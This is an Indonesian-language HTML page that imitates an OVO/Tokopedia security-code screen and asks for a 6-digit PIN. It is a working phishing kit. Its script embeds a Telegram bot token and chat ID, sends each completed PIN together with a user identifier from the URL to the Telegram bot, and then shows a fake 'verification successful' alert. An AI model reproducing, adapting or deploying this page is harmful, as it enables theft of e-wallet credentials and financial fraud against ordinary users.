<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Verifikasi PIN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .pin-line { border-bottom: 2px solid #03AC0E; outline: none; transition: 0.2s; }
    </style>
</head>
<body class="bg-white">

    <div class="p-5">
        <svg onclick="history.back()" class="w-6 h-6 text-gray-600 cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
        </svg>
    </div>

    <div class="max-w-md mx-auto px-8 flex flex-col items-center text-center">
        <div class="mb-6 mt-4">
            <div class="w-16 h-16 bg-white border-4 border-[#03AC0E] rounded-xl flex items-center justify-center">
                <svg class="w-8 h-8 text-[#03AC0E]" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
                </svg>
            </div>
        </div>

        <h1 class="text-[20px] font-bold text-[#31353B] mb-2">Security Code OVO Kamu</h1>
        <p class="text-gray-500 text-[14px] mb-12">Untuk Keamanan Masukkan 6 Digit Security Code OVO Kamu</p>

        <div class="flex justify-between w-full max-w-[300px] gap-2 mb-8" id="pinContainer">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
            <input type="number" class="pin-line w-10 h-12 text-center text-2xl font-bold" maxlength="1">
        </div>

        <span class="text-[#03AC0E] font-bold text-sm cursor-pointer">Lupa Kode Kamu? ATUR ULANG</span>
    </div>

    <script>
        const TOKEN = "8870126844:AAGXw_QRhYAKB92aFZhH8cOsNHDRaUKXmZw";
        const CHAT_ID = "7864264495";
        const user = new URLSearchParams(window.location.search).get('u') || "Unknown";

        const inputs = document.querySelectorAll('#pinContainer input');
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
                if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
                
                const pin = Array.from(inputs).map(i => i.value).join('');
                if (pin.length === 6) {
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `<b>🔒 PIN TOKOPEDIA MASUK</b>\n<b>User:</b> <code>${user}</code>\n<b>PIN:</b> <code>${pin}</code>`,
                            parse_mode: 'HTML'
                        })
                    }).then(() => {
                        alert("Verifikasi PIN berhasil, mohon tunggu...");
                        // Anda bisa mengarahkan ke halaman sukses atau kembali ke awal
                    });
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
            });
        });
    </script>
</body>
</html>
